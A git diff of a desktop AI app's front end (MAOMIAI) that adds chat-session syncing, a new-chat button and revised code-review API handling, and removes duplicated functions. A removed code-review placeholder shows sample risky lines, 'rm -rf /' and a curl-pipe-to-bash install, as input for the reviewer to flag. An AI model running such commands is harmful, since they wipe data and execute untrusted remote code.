@@ -28,12 +28,13 @@
       <div>MAOMIAI</div>
     </div>
     <div class="nav">
-      <button id="nav-chat" class="active" onclick="setView('chat')">✦ 新对话</button>
-      <button id="nav-launch" class="hidden-internal hidden-internal" onclick="setView('launch')">🚀 Launch</button>
-      <button id="nav-brain" class="hidden-internal hidden-internal" onclick="setView('brain')">🧠 Brain Status</button>
-      <button id="nav-skills" class="hidden-internal hidden-internal" onclick="setView('skills')">🧩 Skill Store</button>
-      <button id="nav-documents" class="hidden-internal hidden-internal" onclick="setView('documents')">📄 Documents</button>
-      <button id="nav-workflows" class="hidden-internal hidden-internal" onclick="setView('workflows')">🧬 Workflows</button>
+      <button id="nav-chat" class="active" onclick="setView('chat')">✦ 返回对话</button>
+      <button id="nav-new-chat" onclick="setView('new-chat')">＋ 新对话</button>
+      <button id="nav-launch" class="hidden-internal" onclick="setView('launch')">🚀 Launch</button>
+      <button id="nav-brain" class="hidden-internal" onclick="setView('brain')">🧠 Brain Status</button>
+      <button id="nav-skills" class="hidden-internal" onclick="setView('skills')">🧩 Skill Store</button>
+      <button id="nav-documents" class="hidden-internal" onclick="setView('documents')">📄 Documents</button>
+      <button id="nav-workflows" class="hidden-internal" onclick="setView('workflows')">🧬 Workflows</button>
       <button id="nav-artifacts" onclick="setView('artifacts')">📁 文件与结果</button>
       <button id="nav-code-review" onclick="setView('code-review')">🛡️ 代码检查</button>
       <button id="nav-design-system" class="hidden-internal hidden-internal" onclick="setView('design-system')">🎨 Design System</button>
@@ -135,6 +136,7 @@
     </div>
   </div>
 </div>
+<script src="./js/config/runtime-config.js"></script>
 <script src="./js/api.js"></script>
   <script src="./js/utils.js"></script>
   <script src="./js/tauri-bridge.js"></script>
@@ -147,6 +149,9 @@ let codeReviewRules = null;
 let designSystemPageItems = [];
 let selectedDesignSystemId = null;
 let designSystemLastSuggestion = null;
+let repoMemoryPageItems = [];
+let selectedRepoId = null;
+let repoMemoryKnowledgeItems = [];
 const PORTS = [
   [18093, "Auto Router"],
   [18101, "Reference Skill"],
@@ -190,6 +195,17 @@ function newSession() {
   state.sessions.unshift(s);
   state.current = s.id;
   saveState();
+  // D7-B SYNC: Also sync to router's session system so __MAOMIAI_SESSION_ID__ matches
+  if (typeof window.switchChatSession === "function" || typeof window.createNewChatSession === "function") {
+    // Router is loaded - create a corresponding session there
+    if (typeof window.createNewChatSession === "function") {
+      const routerSessionId = window.createNewChatSession();
+      // Override state session id to match router's session
+      s.id = routerSessionId;
+      state.current = routerSessionId;
+      saveState();
+    }
+  }
   render();
 }
 function systemMessage(text) {
@@ -258,7 +274,21 @@ function render() {
 function setView(view) {
   currentView = view;
   if (view === "chat") {
+    // D7-B FIX: Don't auto-create new session on setView('chat').
+    // Only switch to current session; use 'new-chat' for creating a new one.
+    if (!state.current || !state.sessions.find(x => x.id === state.current)) {
+      state.current = state.sessions[0]?.id;
+    }
+    // D7-B SYNC: Also sync current session ID to router
+    if (state.current && typeof window.switchChatSession === "function") {
+      window.switchChatSession(state.current);
+    }
+    render();
+  } else if (view === "new-chat" || view === "new") {
+    // D7-B: Create new session explicitly
     newSession();
+    currentView = "chat";
+    render();
   } else {
     render();
     if (view === "brain") refreshServices();
@@ -271,10 +301,10 @@ function setView(view) {
   }
 }
 function updateNavActive() {
-  const ids = ["chat", "launch", "brain", "skills", "documents", "workflows", "artifacts", "code-review", "models", "settings"];
+  const ids = ["chat", "new-chat", "launch", "brain", "skills", "documents", "workflows", "artifacts", "code-review", "models", "settings"];
   for (const id of ids) {
     const el = document.getElementById("nav-" + id);
-    if (el) el.classList.toggle("active", currentView === id);
+    if (el) el.classList.toggle("active", currentView === id || (id === "chat" && currentView === "new-chat"));
   }
 }
 function renderPage(content, view) {
@@ -749,28 +779,23 @@ async function reviewCodeDiff() {
   if (findingsBox) findingsBox.textContent = "loading...";
   if (testsBox) testsBox.textContent = "loading...";
   try {
-    const payload = {
-      repo_id: document.getElementById("reviewRepoId")?.value.trim() || "",
-      title: document.getElementById("reviewTitle")?.value.trim() || "Desktop code review",
-      diff: document.getElementById("reviewDiff")?.value || "",
-      source: "desktop_ui",
-    };
-    if (!payload.diff.trim()) {
+    const diff = document.getElementById("reviewDiff")?.value || "";
+    const repoId = document.getElementById("reviewRepoId")?.value.trim() || "";
+    const title = document.getElementById("reviewTitle")?.value.trim() || "Desktop code review";
+    if (!diff.trim()) {
       throw new Error("请先粘贴 diff / patch / 代码片段");
     }
-    // 使用 /execute 端点，兼容 0.2.0-owned 版本
     const json = await postJson(`${API.codeReview}/review_diff`, {
-      prompt: payload.diff,
-      plan: { repo_id: payload.repo_id, title: payload.title, source: payload.source },
-      dry_run: false,
-      metadata: {}
+      repo_id: repoId,
+      title,
+      diff,
+      source: "desktop_ui",
     }, 15000);
     codeReviewLastResult = json;
     renderCodeReviewResult(json);
-    // 直接使用 json.test_suggestions，不需要单独请求
     renderCodeReviewTests({ ok: true, tests: json.test_suggestions || [] });
-    const riskLevel = json.risk || "unknown";
-    const decision = riskLevel === "high" ? "reject" : (riskLevel === "low" ? "approve" : "needs_review");
+    const riskLevel = json.risk_level || json.risk || "unknown";
+    const decision = json.decision || (riskLevel === "critical" || riskLevel === "high" ? "reject" : riskLevel === "low" ? "approve" : "needs_review");
     systemMessage("Code Review 完成：risk=" + riskLevel + ", decision=" + decision);
   } catch (e) {
     if (resultBox) resultBox.textContent = "review failed: " + e.message;
@@ -782,10 +807,9 @@ function renderCodeReviewResult(json) {
   const box = document.getElementById("codeReviewResult");
   const findingsBox = document.getElementById("codeReviewFindings");
   const item = json.item || json.result || json;
-  // 适配 0.2.0-owned 格式
-  const risk = json.risk || item.risk || "unknown";
-  const decision = risk === "high" ? "reject" : (risk === "low" ? "approve" : "needs_review");
-  const reviewId = json.run_id || item.id || "";
+  const risk = json.risk_level || item.risk_level || json.risk || item.risk || "unknown";
+  const decision = json.decision || item.decision || (risk === "critical" || risk === "high" ? "reject" : risk === "low" ? "approve" : "needs_review");
+  const reviewId = json.run_id || item.id || json.id || "";
   if (box) {
     box.innerHTML = `
       <div><b>Decision</b>: ${codeReviewBadge(decision)}</div>
@@ -802,172 +826,7 @@ function renderCodeReviewResult(json) {
   if (findingsBox) {
     findingsBox.innerHTML = findings.length ? findings.map(f => `
       <div class="mini-card">
-        <b>${escapeHtml(f.type || f.category || "Finding")}</b>
-        ${codeReviewBadge("medium")}<br/>
-        <div class="mono">${escapeHtml(f.pattern || "")}</div>
-      </div>
-    `).join("") : "未发现明显风险";
-  }
-}
-function renderCodeReviewTests(json) {
-  const box = document.getElementById("codeReviewTests");
-  if (!box) return;
-  const item = json.item || json.result || json;
-  const tests = item.tests || item.suggestions || json.tests || json.suggestions || [];
-  if (!tests.length) {
-    box.innerHTML = `<pre class="mono">${escapeHtml(JSON.stringify(json, null, 2))}</pre>`;
-    return;
-  }
-  box.innerHTML = tests.map(t => `
-    <div class="mini-card">
-      <b>${escapeHtml(t.title || t.name || "Test Suggestion")}</b><br/>
-      <div>${escapeHtml(t.description || t.reason || "")}</div>
-      ${t.command ? `<div class="mono">${escapeHtml(t.command)}</div>` : ""}
-    </div>
-  `).join("");
-}
-async function loadCodeReviewRules() {
-  const box = document.getElementById("codeReviewRulesBox");
-  if (box) box.textContent = "loading recent reviews...";
-  try {
-    const res = await fetch(`${API.codeReview}/recent?limit=20`, { signal: AbortSignal.timeout(8000) });
-    const json = await res.json();
-    codeReviewRules = json;
-    if (box) {
-      box.innerHTML = `<pre class="mono">${escapeHtml(JSON.stringify(json, null, 2))}</pre>`;
-    }
-  } catch (e) {
-    if (box) box.textContent = "load failed: " + e.message;
-  }
-}
-async function loadCodeReviewSummary() {
-  const box = document.getElementById("codeReviewRulesBox");
-  if (box) box.textContent = "loading service summary...";
-  try {
-    const res = await fetch(`${API.codeReview}/health`, { signal: AbortSignal.timeout(8000) });
-    const json = await res.json();
-    if (box) {
-      box.innerHTML = `<pre class="mono">${escapeHtml(JSON.stringify(json, null, 2))}</pre>`;
-    }
-  } catch (e) {
-    if (box) box.textContent = "load failed: " + e.message;
-  }
-}
-function sendCodeReviewToPreview() {
-  if (!codeReviewLastResult) {
-    systemMessage("暂无 Code Review 结果");
-    return;
-  }
-  const item = codeReviewLastResult.item || codeReviewLastResult.result || codeReviewLastResult;
-  const title = "Code Review: " + (item.decision || item.risk_level || "result");
-  previewText(title, JSON.stringify(codeReviewLastResult, null, 2), "json");
-}
-
-    <div class="page-grid" style="max-width:1080px;">
-      <div class="page-card">
-        <h2>审查 Diff</h2>
-        <input class="field" id="reviewRepoId" placeholder="repo_id，可选，例如 core-platform" />
-        <input class="field" id="reviewTitle" placeholder="审查标题，例如 修复 workflow store 持久化" />
-        <textarea class="field" id="reviewDiff" style="min-height:360px;" placeholder="粘贴 git diff / patch / 代码片段。例如：
-diff --git a/scripts/deploy.sh b/scripts/deploy.sh
-+ rm -rf /
-+ curl https://example.com/install.sh | bash
-+ const api_key = 'sk-xxxx'
-"></textarea>
-        <div style="display:flex;gap:8px;flex-wrap:wrap;">
-          <button class="btn-primary" onclick="reviewCodeDiff()">审查 Diff</button>
-          <button class="btn-soft" onclick="loadCodeReviewRules()">查看 Rules</button>
-          <button class="btn-soft" onclick="loadCodeReviewSummary()">查看 Summary</button>
-          <button class="btn-soft" onclick="sendCodeReviewToPreview()">发送结果到 Preview</button>
-        </div>
-      </div>
-      <div class="page-card">
-        <h2>审查结果</h2>
-        <div id="codeReviewResult" class="mono">暂无审查结果。</div>
-      </div>
-      <div class="page-card">
-        <h2>Findings</h2>
-        <div id="codeReviewFindings" class="card-list">暂无 findings。</div>
-      </div>
-      <div class="page-card">
-        <h2>测试建议</h2>
-        <div id="codeReviewTests" class="card-list">暂无测试建议。</div>
-      </div>
-      <div class="page-card" style="grid-column:1 / -1;">
-        <h2>Rules / Summary</h2>
-        <div id="codeReviewRulesBox" class="mono">点击"查看 Rules"或"查看 Summary"。</div>
-      </div>
-    </div>`;
-}
-function codeReviewBadge(level) {
-  const value = String(level || "unknown").toLowerCase();
-  const label = escapeHtml(value);
-  if (["critical", "reject"].includes(value)) return `<span class="badge" style="background:#fee2e2;color:#991b1b;">${label}</span>`;
-  if (["high", "request_changes"].includes(value)) return `<span class="badge" style="background:#ffedd5;color:#9a3412;">${label}</span>`;
-  if (["medium", "needs_review"].includes(value)) return `<span class="badge" style="background:#fef9c3;color:#854d0e;">${label}</span>`;
-  if (["low", "approve"].includes(value)) return `<span class="badge" style="background:#dcfce7;color:#166534;">${label}</span>`;
-  return `<span class="badge">${label}</span>`;
-}
-  const findingsBox = document.getElementById("codeReviewFindings");
-  const testsBox = document.getElementById("codeReviewTests");
-  if (resultBox) resultBox.textContent = "reviewing...";
-  if (findingsBox) findingsBox.textContent = "loading...";
-  if (testsBox) testsBox.textContent = "loading...";
-  try {
-    const payload = {
-      repo_id: document.getElementById("reviewRepoId")?.value.trim() || "",
-      title: document.getElementById("reviewTitle")?.value.trim() || "Desktop code review",
-      diff: document.getElementById("reviewDiff")?.value || "",
-      source: "desktop_ui",
-    };
-    if (!payload.diff.trim()) {
-      throw new Error("请先粘贴 diff / patch / 代码片段");
-    }
-    const json = await postJson(`${API.codeReview}/review_diff`, payload, 15000);
-    codeReviewLastResult = json;
-    renderCodeReviewResult(json);
-    let tests = null;
-    try {
-      tests = await postJson(`${API.codeReview}/suggest_tests`, {
-        repo_id: payload.repo_id,
-        diff: payload.diff,
-        findings: json.findings || json.item?.findings || [],
-      }, 12000);
-    } catch (e) {
-      tests = { ok: false, error: e.message };
-    }
-    renderCodeReviewTests(tests);
-    systemMessage("Code Review 完成：" + (json.decision || json.item?.decision || "unknown"));
-  } catch (e) {
-    if (resultBox) resultBox.textContent = "review failed: " + e.message;
-    if (findingsBox) findingsBox.textContent = "暂无 findings。";
-    if (testsBox) testsBox.textContent = "暂无测试建议。";
-  }
-}
-function renderCodeReviewResult(json) {
-  const box = document.getElementById("codeReviewResult");
-  const findingsBox = document.getElementById("codeReviewFindings");
-  const item = json.item || json.result || json;
-  const risk = item.risk_level || json.risk_level || "unknown";
-  const decision = item.decision || json.decision || "unknown";
-  const reviewId = item.id || json.id || "";
-  if (box) {
-    box.innerHTML = `
-      <div><b>Decision</b>: ${codeReviewBadge(decision)}</div>
-      <div><b>Risk</b>: ${codeReviewBadge(risk)}</div>
-      ${reviewId ? `<div class="mono" style="margin-top:8px;">${escapeHtml(reviewId)}</div>` : ""}
-      <h3 style="margin-top:16px;">Raw Result</h3>
-      <pre class="mono">${escapeHtml(JSON.stringify(json, null, 2))}</pre>
-      <div style="margin-top:12px;">
-        <button class="btn-soft" onclick="sendCodeReviewToPreview()">发送到 Preview</button>
-      </div>
-    `;
-  }
-  const findings = item.findings || json.findings || [];
-  if (findingsBox) {
-    findingsBox.innerHTML = findings.length ? findings.map(f => `
-      <div class="mini-card">
-        <b>${escapeHtml(f.title || f.rule_id || f.category || "Finding")}</b>
+        <b>${escapeHtml(f.title || f.type || f.category || f.rule_id || "Finding")}</b>
         ${codeReviewBadge(f.risk_level || f.severity || "medium")}<br/>
         <div>${escapeHtml(f.message || f.description || "")}</div>
         ${f.line ? `<span class="mono">line: ${escapeHtml(String(f.line))}</span>` : ""}
@@ -993,11 +852,22 @@ function renderCodeReviewTests(json) {
     </div>
   `).join("");
 }
+
+function sendCodeReviewToPreview() {
+  if (!codeReviewLastResult) {
+    systemMessage("暂无 Code Review 结果");
+    return;
+  }
+  const item = codeReviewLastResult.item || codeReviewLastResult.result || codeReviewLastResult;
+  const title = "Code Review: " + (item.decision || item.risk_level || "result");
+  previewText(title, JSON.stringify(codeReviewLastResult, null, 2), "json");
+}
+
 async function loadCodeReviewRules() {
   const box = document.getElementById("codeReviewRulesBox");
-  if (box) box.textContent = "loading rules...";
+  if (box) box.textContent = "loading recent reviews...";
   try {
-    const res = await fetch(`${API.codeReview}/rules`, { signal: AbortSignal.timeout(8000) });
+    const res = await fetch(`${API.codeReview}/recent?limit=20`, { signal: AbortSignal.timeout(8000) });
     const json = await res.json();
     codeReviewRules = json;
     if (box) {
@@ -1009,9 +879,9 @@ async function loadCodeReviewRules() {
 }
 async function loadCodeReviewSummary() {
   const box = document.getElementById("codeReviewRulesBox");
-  if (box) box.textContent = "loading summary...";
+  if (box) box.textContent = "loading service summary...";
   try {
-    const res = await fetch(`${API.codeReview}/summary`, { signal: AbortSignal.timeout(8000) });
+    const res = await fetch(`${API.codeReview}/health`, { signal: AbortSignal.timeout(8000) });
     const json = await res.json();
     if (box) {
       box.innerHTML = `<pre class="mono">${escapeHtml(JSON.stringify(json, null, 2))}</pre>`;
@@ -1019,15 +889,6 @@ async function loadCodeReviewSummary() {
   } catch (e) {
     if (box) box.textContent = "load summary failed: " + e.message;
   }
-}
-function sendCodeReviewToPreview() {
-  if (!codeReviewLastResult) {
-    systemMessage("暂无 Code Review 结果");
-    return;
-  }
-  const item = codeReviewLastResult.item || codeReviewLastResult.result || codeReviewLastResult;
-  const title = "Code Review: " + (item.decision || item.risk_level || "result");
-  previewText(title, JSON.stringify(codeReviewLastResult, null, 2), "json");
 }
 
 function renderRepoMemoryPage(content) {
@@ -1465,6 +1326,10 @@ function renderSessions() {
     b.onclick = () => {
       state.current = s.id;
       saveState();
+      // D7-B SYNC: Also switch router session
+      if (typeof window.switchChatSession === "function") {
+        window.switchChatSession(s.id);
+      }
       render();
     };
     box.appendChild(b);
@@ -2462,16 +2327,7 @@ function copyRun(id) {
   const r = currentSession().runs.find(x => x.id === id);
   if (r) navigator.clipboard.writeText(r.log || "");
 }
-async function postJson(url, body) {
-  const res = await fetch(url, {
-    method: "POST",
-    headers: {"Content-Type": "application/json"},
-    body: JSON.stringify(body),
-    signal: AbortSignal.timeout(60000)
-  });
-  if (!res.ok) throw new Error(`${url} failed: ${res.status}`);
-  return await res.json();
-}
+// postJson moved to ./js/api.js
 // escapeHtml moved to ./js/utils.js
 render();
 refreshServices();
